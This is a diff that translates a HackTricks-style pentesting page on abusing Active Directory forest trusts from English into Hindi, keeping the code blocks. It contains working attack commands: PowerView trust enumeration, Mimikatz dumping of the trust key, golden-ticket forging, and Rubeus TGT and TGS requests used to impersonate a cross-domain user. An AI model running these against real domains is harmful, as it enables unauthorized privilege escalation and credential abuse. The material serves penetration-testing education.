@@ -1,13 +1,12 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# बाहरी वन डोमेन - एकतरफा (इनबाउंड) या द्विदिशात्मक
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+इस परिदृश्य में एक बाहरी डोमेन आप पर भरोसा कर रहा है (या दोनों एक-दूसरे पर भरोसा कर रहे हैं), इसलिए आप इसके ऊपर कुछ प्रकार की पहुंच प्राप्त कर सकते हैं।
 
-## Enumeration
+## गणना
 
-First of all, you need to **enumerate** the **trust**:
-
+सबसे पहले, आपको **गणना** करनी होगी **विश्वास** की:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -32,7 +31,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -57,48 +56,42 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
+पिछली गणना में यह पाया गया कि उपयोगकर्ता **`crossuser`** **`External Admins`** समूह के अंदर है, जिसके पास **DC of the external domain** के अंदर **Admin access** है।
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+## प्रारंभिक पहुंच
 
-## Initial Access
+यदि आप अन्य डोमेन में अपने उपयोगकर्ता की कोई **विशेष** पहुंच नहीं पा रहे हैं, तो आप अभी भी AD पद्धति पर वापस जा सकते हैं और **एक अप्रिविलेज्ड उपयोगकर्ता से प्रिवेस्क** करने की कोशिश कर सकते हैं (उदाहरण के लिए, केरबेरोस्टिंग जैसी चीजें):
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
-
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
-
+आप **Powerview functions** का उपयोग करके `-Domain` पैरामीटर के साथ **अन्य डोमेन** को **गणना** करने के लिए कर सकते हैं जैसे:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
-
 {{#ref}}
 ./
 {{#endref}}
 
-## Impersonation
+## अनुकरण
 
-### Logging in
+### लॉग इन करना
 
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
-
+एक सामान्य विधि का उपयोग करते हुए, जिन उपयोगकर्ताओं के पास बाहरी डोमेन तक पहुंच है, उनके क्रेडेंशियल्स के साथ आपको निम्नलिखित तक पहुंच प्राप्त करनी चाहिए:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
+### SID इतिहास का दुरुपयोग
 
-### SID History Abuse
+आप एक जंगल ट्रस्ट के पार [**SID इतिहास**](sid-history-injection.md) का भी दुरुपयोग कर सकते हैं।
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
-
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+यदि एक उपयोगकर्ता **एक जंगल से दूसरे जंगल में** स्थानांतरित किया जाता है और **SID फ़िल्टरिंग सक्षम नहीं है**, तो **दूसरे जंगल से एक SID जोड़ना** संभव हो जाता है, और यह **SID** **विश्वास** के पार प्रमाणीकरण करते समय **उपयोगकर्ता के टोकन** में **जोड़ा** जाएगा।
 
 > [!WARNING]
-> As a reminder, you can get the signing key with
+> याद दिलाने के लिए, आप साइनिंग कुंजी प्राप्त कर सकते हैं
 >
 > ```powershell
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+आप **वर्तमान डोमेन** के उपयोगकर्ता का **TGT अनुकरण** करने के लिए **विश्वसनीय** कुंजी के साथ **हस्ताक्षर** कर सकते हैं।
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -109,9 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
-### Full way impersonating the user
-
+### उपयोगकर्ता का पूर्ण तरीके से अनुकरण करना
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -125,6 +116,4 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
-
